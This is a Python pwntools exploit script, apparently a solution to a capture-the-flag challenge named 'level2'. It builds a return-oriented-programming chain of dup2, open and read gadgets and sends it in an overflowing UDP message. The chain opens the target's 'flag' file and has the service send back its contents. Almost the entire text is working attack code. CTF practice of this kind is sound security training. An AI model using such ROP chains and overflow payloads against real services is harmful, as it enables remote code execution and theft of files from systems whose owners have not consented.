#!/usr/bin/python
import socket
from pwn import *
import time
import sys
if (len(sys.argv)<3):
    print "usage: <ip> <port>"
    exit(0)
server = sys.argv[1]
tcp_port = sys.argv[2]


conn = remote(server,tcp_port)
conn.sendline("Lv2")
print conn.recvuntil("OK ")
port = conn.recvline()

raw_input("Received port = "+port)

UDP_IP = server
UDP_LOCAL_PORT = int(port)

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # UDP
context.clear(arch="amd64")
e = ELF("./level2")
r = ROP(e)
#legacy ropchain that just skip the stack part with some bad spots
r.dup2(12,0)
r.raw(0x0000000000406935)#pop r14 ; pop r15 ; ret
r.raw(0xdeadbee1)
r.raw(0xdeadb002)
r.dup2(12,1)

#real chain

#set "flag" in bss
r.incr(e.symbols["ip"],u64("flag\x00\x00\x00\x00"))
#manually set rdx to "read mode" for open()
r.raw(0x405c65) # pop rdx ; pop rcx ; add sp,0x8 ; ret
r.raw(0x0)
r.raw(0xdeadbee3)
r.raw(0xdeadbee4)
#open(flag, readonly)
r.open(e.symbols["ip"],0x0)
#manually set rdx to len for read()
r.raw(0x405c65) # pop rdx ; pop rcx ; add sp,0x8 ; ret
r.raw(0x100)
r.raw(0xdeadbee5)
r.raw(0xdeadbee6)
#reading at "ip" flag file content
r.read(0x9,e.symbols["ip"])
#sending back the flag
r.sendMessage(e.symbols["ip"])

#end chain

print r.dump()

ropchain = str(r)



MESSAGE="-1|-1\n"
sock.sendto(MESSAGE, (UDP_IP, int(port)));
data, addr = sock.recvfrom(1024)
print "data "+data
MESSAGE="0|0" + "A"*21 + ropchain +"\n"
sock.sendto(MESSAGE, (UDP_IP, int(port)));

print "waiting for data -> "
while True:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
    print "received message:", data
    if "flag" in data:
        print "Challenge working"
        exit(0)
